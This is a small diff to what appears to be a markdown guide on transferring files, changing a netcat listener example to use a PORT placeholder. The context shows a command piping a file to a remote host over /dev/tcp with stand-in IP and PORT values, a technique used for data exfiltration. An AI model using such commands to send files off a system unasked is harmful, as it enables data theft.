@@ -46,7 +46,7 @@ cat file.zip > /dev/tcp/IP/PORT
 This will send the contents of a file file.zip over a TCP connection to a remote host IP on a specific PORT. We can recieve the file with netcat with the following command. 
 
 ```bash
-nc -lvnp 9001 > file.zip
+nc -lvnp PORT > file.zip
 ```
 
 
